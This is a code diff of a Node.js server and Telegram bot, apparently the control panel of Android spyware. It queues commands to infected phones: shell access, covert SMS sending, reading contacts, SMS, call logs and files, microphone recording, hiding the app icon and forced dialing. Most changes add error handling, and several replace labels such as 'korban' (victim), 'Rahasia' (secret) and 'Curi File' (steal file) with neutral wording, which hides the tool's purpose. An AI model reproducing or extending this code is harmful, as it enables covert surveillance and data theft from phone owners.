@@ -27,40 +27,50 @@ const app = express();
 // --- DATABASE SETUP ---
 let db;
 (async () => {
-    db = await open({
-        filename: './database.sqlite',
-        driver: sqlite3.Database
-    });
+    try {
+        db = await open({
+            filename: './database.sqlite',
+            driver: sqlite3.Database
+        });
 
-    // Buat Tabel jika belum ada
-    await db.exec(`CREATE TABLE IF NOT EXISTS devices (
-        id TEXT PRIMARY KEY, 
-        last_seen REAL DEFAULT 0,
-        info TEXT
-    )`);
+        // Buat Tabel jika belum ada
+        await db.exec(`CREATE TABLE IF NOT EXISTS devices (
+            id TEXT PRIMARY KEY, 
+            last_seen REAL DEFAULT 0,
+            info TEXT
+        )`);
 
-    await db.exec(`CREATE TABLE IF NOT EXISTS commands (
-        id TEXT PRIMARY KEY,
-        device_id TEXT,
-        command TEXT,
-        text TEXT,
-        status TEXT DEFAULT 'pending',
-        chat_id TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )`);
+        await db.exec(`CREATE TABLE IF NOT EXISTS commands (
+            id TEXT PRIMARY KEY,
+            device_id TEXT,
+            command TEXT,
+            text TEXT,
+            status TEXT DEFAULT 'pending',
+            chat_id TEXT,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )`);
 
-    // Tambah kolom jika dari versi sebelumnya belum ada
-    try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
-    try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
+        // Tambah kolom jika dari versi sebelumnya belum ada
+        try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
+        try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
 
-    await db.exec(`CREATE TABLE IF NOT EXISTS system_logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        device_id TEXT,
-        command_id TEXT,
-        level TEXT DEFAULT 'INFO',
-        message TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )`);
+        await db.exec(`CREATE TABLE IF NOT EXISTS system_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT,
+            command_id TEXT,
+            level TEXT DEFAULT 'INFO',
+            message TEXT,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )`);
+
+        // Server baru boleh mendengarkan setelah DB SIAP
+        app.listen(PORT, () => {
+            console.log(`Server Node.js berjalan di port ${PORT}`);
+        });
+    } catch (dbErr) {
+        console.error("KRITIKAL: Gagal inisialisasi Database!", dbErr);
+        process.exit(1);
+    }
 })();
 
 // --- MIDDLEWARE ---
@@ -79,16 +89,40 @@ const updateDeviceSeen = async (deviceId) => {
 };
 
 // Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
-const escapeHTML = (str) => String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
+const escapeHTML = (str) => {
+    if (str === null || str === undefined) return '';
+    return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#39;");
+};
+
 const formatDeviceResponse = (data) => {
+    if (data === null || data === undefined) return '\n└ [Kosong]';
     if (typeof data === 'string') return `\n└ ${escapeHTML(data)}`;
+
     if (Array.isArray(data)) {
         if (data.length === 0) return '\n└ [Data Kosong]';
-        return '\n' + data.map((item, idx) => `  ${idx + 1}. ` + (typeof item === 'object' && item !== null ? Object.entries(item).map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`).join(' | ') : escapeHTML(item))).join('\n');
+        return '\n' + data.map((item, idx) => {
+            const prefix = `  ${idx + 1}. `;
+            if (typeof item === 'object' && item !== null) {
+                return prefix + Object.entries(item)
+                    .map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`)
+                    .join(' | ');
+            }
+            return prefix + escapeHTML(item);
+        }).join('\n');
     }
-    if (typeof data === 'object' && data !== null) {
-        return '\n' + Object.entries(data).map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`).join('\n');
+
+    if (typeof data === 'object') {
+        return '\n' + Object.entries(data)
+            .map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`)
+            .join('\n');
     }
+
     return `\n└ ${escapeHTML(data)}`;
 };
 
@@ -110,7 +144,7 @@ const commandsWithArgs = {
     'set_wallpaper': 'Masukkan URL Gambar untuk Wallpaper baru:',
     'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
     'shell': 'Masukkan perintah Shell/Terminal:',
-    'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar diam-diam:'
+    'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
 };
 
 // --- RENDER PAGINATION FILE EXPLORER ---
@@ -186,7 +220,7 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
         bot.telegram.setMyCommands([
             { command: 'start', description: 'Lihat menu utama bot' },
             { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
-            { command: 'help', description: 'Bantuan & Daftar Perintah Rahasia' },
+            { command: 'help', description: 'Bantuan & Daftar Perintah Lanjutan' },
             { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
         ]).catch(err => console.error("Gagal mendaftarkan menu perintah (Telegram Timeout):", err.message));
     } catch (e) {
@@ -204,7 +238,7 @@ Cukup ketik /list, pilih perangkat, dan tekan tombol:
 📻 Info Volume | 🌐 WiFi Scan | 📋 Clipboard
 ℹ️ Info Sistem | ⚙️ Sensor
 
-<b>2. Mode Rahasia (Manual)</b>
+<b>2. Mode Lanjutan (Manual)</b>
 Harus diketik dengan format: 
 <code>/cmd [id_device] [nama_perintah] [teks_opsional]</code>
 
@@ -213,16 +247,16 @@ Harus diketik dengan format:
 • <b>set_volume</b> : Mengatur volume (music/ring/alarm/notification) [angka]
 • <b>tts</b> : Berbicara text-to-speech menirukan suara robot
 • <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
-• <b>sms_send</b> : Mengirim SMS dari HP target tanpa ketahuan (Format: <code>Nomor|Pesan</code>)
-• <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi dari URL web
+• <b>sms_send</b> : Mengirim SMS dari HP target dari latar belakang (Format: <code>Nomor|Pesan</code>)
+• <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi/latar belakang dari URL web
 • <b>record_sound</b> : Merekam mikrofon (Format: argumen detik, cth <code>5</code>)
 • <b>hide_app</b> : Menyembunyikan ikon aplikasi dari Laci Utama HP Target (Stealth Mode)
-• <b>vibrate</b> : Menggetarkan HP korban (Format: angka detik, cth <code>3</code>)
+• <b>vibrate</b> : Menggetarkan HP target (Format: angka detik, cth <code>3</code>)
 • <b>play_alarm</b> : Membunyikan sirine/nada alarm sekencang mungkin
 • <b>get_call_logs</b> : Mengambil histori panggilan keluar/masuk (Format: limit angka, cth <code>20</code>)
-• <b>get_installed_apps</b> : Mendapatkan daftar lengkap aplikasi korban yang terinstal
-• <b>open_url</b> : Memaksa korban membuka browser (Format: link tujuan, cth <code>google.com</code>)
-• <b>set_wallpaper</b> : Mengubah Wallpaper korban (Format: URL link gambar)
+• <b>get_installed_apps</b> : Mendapatkan daftar lengkap aplikasi target yang terinstal
+• <b>open_url</b> : Memaksa target membuka browser (Format: link tujuan, cth <code>google.com</code>)
+• <b>set_wallpaper</b> : Mengubah Wallpaper target (Format: URL link gambar)
 • <b>dial_number</b> : Melakukan panggilan keluar/USSD paksa (Format: nomor HP target, cth <code>*123#</code>)
 `;
         ctx.reply(helpText, { parse_mode: 'HTML' });
@@ -291,7 +325,7 @@ Harus diketik dengan format:
             [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
             [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
             [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
-            [{ text: isSecret ? '🏠 Menu Utama' : '🛠 Fitur Rahasia', callback_data: isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`, style: isSecret ? 'success' : 'danger' }]
+            [{ text: isSecret ? '🏠 Menu Utama' : '🛠 Fitur Lanjutan', callback_data: isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`, style: isSecret ? 'success' : 'danger' }]
         ];
 
         if (isSecret) {
@@ -310,7 +344,7 @@ Harus diketik dengan format:
         }
 
         const isResult = ctx.callbackQuery.message.text && (ctx.callbackQuery.message.text.includes('Respon') || ctx.callbackQuery.message.text.includes('Data'));
-        const caption = isResult ? ctx.callbackQuery.message.text.replace('⏳ Menunggu Respon...', '') : `🎯 <b>Menu ${isSecret ? 'Rahasia' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
+        const caption = isResult ? ctx.callbackQuery.message.text.replace('⏳ Menunggu Respon...', '') : `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
 
         menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
         const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
@@ -332,7 +366,7 @@ Harus diketik dengan format:
 
     bot.action(/^secret_menu:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
-        ctx.answerCbQuery('Membuka Fitur Rahasia...').catch(() => { });
+        ctx.answerCbQuery('Membuka Fitur Lanjutan...').catch(() => { });
         sendDeviceMenu(ctx, devId, true);
     });
 
@@ -356,7 +390,7 @@ Harus diketik dengan format:
         if (cmdName === 'get_volume') {
             activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
             const cancelBtn = { inline_keyboard: [[{ text: '❌ Tutup & Batal Ubah Volume', callback_data: 'cancel_input', style: 'danger' }]] };
-            ctx.reply(`💡 Untuk **mengubah** volume HP korban, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
+            ctx.reply(`💡 Untuk **mengubah** volume HP target, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
         }
 
         // Dekode shortId jika menggunakan Mapping Path ID
@@ -607,7 +641,7 @@ app.post('/response', async (req, res) => {
                     await bot.telegram.sendDocument(cmd.chat_id, {
                         source: fileBuffer,
                         filename: deviceResponse.name
-                    }, { caption: `✅ <b>Berhasil Curi File (${escapeHTML(client_id)})</b>\n📂 Nama: ${deviceResponse.name}`, parse_mode: 'HTML', ...getNavOpts() });
+                    }, { caption: `✅ <b>Berhasil Mengunduh File (${escapeHTML(client_id)})</b>\n📂 Nama: ${escapeHTML(deviceResponse.name)}`, parse_mode: 'HTML', ...getNavOpts() });
                     return res.json({ status: 'received' });
                 }
 
@@ -624,7 +658,7 @@ app.post('/response', async (req, res) => {
                 }
 
                 if (data.type === 'upload_success') {
-                    await sendOrEdit(`✅ <b>File berhasil disusupkan!</b>\n└ ${escapeHTML(deviceResponse)}`);
+                    await sendOrEdit(`✅ <b>File berhasil diunggah!</b>\n└ ${escapeHTML(deviceResponse)}`);
                     // Auto Refresh ls
                     const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                     const refreshCmdId = uuidv4().slice(0, 8);
@@ -675,6 +709,7 @@ app.post('/response', async (req, res) => {
                     }
                 } else {
                     const formattedDisplay = formatDeviceResponse(deviceResponse);
+                    // Tambahkan pengamanan ekstra: jika formattedDisplay masih mengandung tag mencurigakan (untuk jaga-jaga)
                     const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
                     await sendOrEdit(replyMessage);
                 }
@@ -709,68 +744,130 @@ app.post('/admin/logout', (req, res) => {
 });
 
 app.get('/admin/api/devices', async (req, res) => {
-    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    const devices = await db.all('SELECT * FROM devices');
-    const now = Date.now() / 1000;
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
 
-    const devicesData = devices.map(d => ({
-        id: d.id,
-        last_seen: d.last_seen,
-        is_online: (now - d.last_seen) < 60
-    }));
-    res.json({ devices: devicesData });
+        const devices = await db.all('SELECT * FROM devices');
+        const now = Date.now() / 1000;
+
+        const devicesData = devices.map(d => ({
+            id: d.id,
+            last_seen: d.last_seen,
+            is_online: (now - d.last_seen) < 60
+        }));
+        res.json({ devices: devicesData });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
+    }
 });
 
 app.get('/admin/api/logs', async (req, res) => {
-    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
 
-    const query = `
-        SELECT 
-            id,
-            'log' as type,
-            device_id, 
-            command_id, 
-            level, 
-            created_at, 
-            SUBSTR(message, 1, 300) AS message_preview 
-        FROM system_logs 
-        WHERE command_id IS NULL
-        
-        UNION ALL 
-        
-        SELECT 
-            COALESCE(l.id, c.id) as id,
-            CASE WHEN l.id IS NOT NULL THEN 'log' ELSE 'cmd' END as type,
-            c.device_id, 
-            c.id AS command_id, 
-            CASE WHEN l.id IS NOT NULL THEN l.level ELSE c.status END AS level, 
-            COALESCE(l.created_at, c.created_at) as created_at, 
-            SUBSTR('Cmd: ' || c.command || ' ' || c.text || COALESCE(' ➔ ' || l.message, ''), 1, 300) AS message_preview 
-        FROM commands c
-        LEFT JOIN system_logs l ON c.id = l.command_id
-        
-        ORDER BY created_at DESC LIMIT 100
-    `;
+        const query = `
+            SELECT 
+                id,
+                'log' as type,
+                device_id, 
+                command_id, 
+                level, 
+                created_at, 
+                SUBSTR(message, 1, 300) AS message_preview 
+            FROM system_logs 
+            WHERE command_id IS NULL
+            
+            UNION ALL 
+            
+            SELECT 
+                COALESCE(l.id, c.id) as id,
+                CASE WHEN l.id IS NOT NULL THEN 'log' ELSE 'cmd' END as type,
+                c.device_id, 
+                c.id AS command_id, 
+                CASE WHEN l.id IS NOT NULL THEN l.level ELSE c.status END AS level, 
+                COALESCE(l.created_at, c.created_at) as created_at, 
+                SUBSTR('Cmd: ' || c.command || ' ' || c.text || COALESCE(' ➔ ' || l.message, ''), 1, 300) AS message_preview 
+            FROM commands c
+            LEFT JOIN system_logs l ON c.id = l.command_id
+            
+            ORDER BY created_at DESC LIMIT 100
+        `;
 
-    const logs = await db.all(query);
+        const logs = await db.all(query);
 
-    const formattedLogs = logs.map(l => {
-        let preview = l.message_preview;
-        if (preview && preview.length >= 300 && l.type === 'log') {
-            preview += '... [Lihat Detail untuk Full JSON/Media]';
+        const formattedLogs = logs.map(l => {
+            let preview = l.message_preview;
+            if (preview && preview.length >= 300 && l.type === 'log') {
+                preview += '... [Lihat Detail untuk Full JSON/Media]';
+            }
+            return {
+                id: l.id,
+                type: l.type,
+                device_id: l.device_id,
+                command_id: l.command_id,
+                level: l.level,
+                created_at: l.created_at,
+                message: preview
+            };
+        });
+
+        let hostLogs = [];
+        const stderrPath = path.join(__dirname, 'stderr.log');
+        if (fs.existsSync(stderrPath)) {
+            try {
+                const fileContent = fs.readFileSync(stderrPath, 'utf8');
+                // Pisahkan per blok unit error jika diawali path absolut, nama Error, Unhandled Rejection, atau pesan "Failed to"
+                const blocks = fileContent.split(/(?<=^|\n)(?=\/[a-zA-Z0-9_\-\/]+\.js:\d+|[a-zA-Z]+Error:|UnhandledPromiseRejection|Failed to [a-z]+)/i);
+
+                hostLogs = blocks.map((b, idx) => {
+                    const text = b.trim();
+                    if (!text) return null;
+                    const lines = text.split('\n');
+                    let title = lines[0];
+
+                    // Cari bentuk error standar seperti Exception, TelegramError, atau Unhandled Rejection
+                    const errMatch = text.match(/(?:[a-zA-Z]+Error|Exception|UnhandledPromiseRejection): .+/i);
+                    if (errMatch) title = errMatch[0];
+
+                    return {
+                        id: 'err_' + Date.now() + '_' + idx,
+                        title: title.length > 150 ? title.substring(0, 150) + '...' : title,
+                        full: text
+                    };
+                }).filter(h => h !== null).reverse().slice(0, 50);
+            } catch (e) {
+                hostLogs = [{ id: 'err_read', title: 'Gagal membaca stderr.log', full: e.message }];
+            }
         }
-        return {
-            id: l.id,
-            type: l.type,
-            device_id: l.device_id,
-            command_id: l.command_id,
-            level: l.level,
-            created_at: l.created_at,
-            message: preview
-        };
-    });
 
-    res.json({ logs: formattedLogs });
+        res.json({ logs: formattedLogs, hostLogs });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
+    }
+});
+
+app.get('/admin/api/log/:id', async (req, res) => {
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
+
+        const logId = req.params.id;
+        const log = await db.get('SELECT * FROM system_logs WHERE id = ?', [logId]);
+        if (!log) return res.status(404).json({ error: 'Log tidak ditemukan di database.' });
+
+        let parsedBody = {};
+        try {
+            parsedBody = JSON.parse(log.message);
+        } catch (e) {
+            parsedBody = { raw_data: log.message };
+        }
+
+        res.json({ log, parsedBody });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
+    }
 });
 
 app.get('/admin/log/:id', async (req, res) => {
@@ -788,36 +885,52 @@ app.get('/admin/log/:id', async (req, res) => {
 });
 
 app.post('/admin/api/command', async (req, res) => {
-    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    const { device_id, command, text } = req.body;
-    const cmdId = uuidv4().slice(0, 8);
-    await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
-        [cmdId, device_id, command, text || '', 'pending']);
-    res.json({ status: 'success', command_id: cmdId });
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
+
+        const { device_id, command, text } = req.body;
+        const cmdId = uuidv4().slice(0, 8);
+        await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
+            [cmdId, device_id, command, text || '', 'pending']);
+        res.json({ status: 'success', command_id: cmdId });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
+    }
 });
 
 app.delete('/admin/api/device/:id', async (req, res) => {
-    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    const devId = req.params.id;
-    await db.run('DELETE FROM commands WHERE device_id = ?', [devId]);
-    await db.run('DELETE FROM system_logs WHERE device_id = ?', [devId]);
-    await db.run('DELETE FROM devices WHERE id = ?', [devId]);
-    res.json({ status: 'success', message: 'Perangkat berhasil dibersihkan dari registry.' });
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
+
+        const devId = req.params.id;
+        await db.run('DELETE FROM commands WHERE device_id = ?', [devId]);
+        await db.run('DELETE FROM system_logs WHERE device_id = ?', [devId]);
+        await db.run('DELETE FROM devices WHERE id = ?', [devId]);
+        res.json({ status: 'success', message: 'Perangkat berhasil dibersihkan dari registry.' });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
+    }
 });
 
 app.delete('/admin/api/logs', async (req, res) => {
-    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    const filterDays = parseInt(req.query.days) || 0;
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        if (!db) return res.status(503).json({ error: 'Database belum siap' });
 
-    if (filterDays === 0) {
-        await db.run('DELETE FROM system_logs');
-    } else {
-        // Syntax SQLite untuk pengurangan waktu
-        await db.run(`DELETE FROM system_logs WHERE datetime(created_at) < datetime('now', '-${filterDays} days')`);
+        const filterDays = parseInt(req.query.days) || 0;
+
+        if (filterDays === 0) {
+            await db.run('DELETE FROM system_logs');
+        } else {
+            await db.run(`DELETE FROM system_logs WHERE datetime(created_at) < datetime('now', '-${filterDays} days')`);
+        }
+        res.json({ status: 'success', message: 'Log sistem berhasil dibersihkan.' });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal Server Error', details: e.message });
     }
-    res.json({ status: 'success', message: 'Log sistem berhasil dibersihkan.' });
 });
 
-app.listen(PORT, () => {
-    console.log(`Server Node.js berjalan di port ${PORT}`);
-});
+// app.listen dipindahkan ke inisialisasi DB di awal file
+
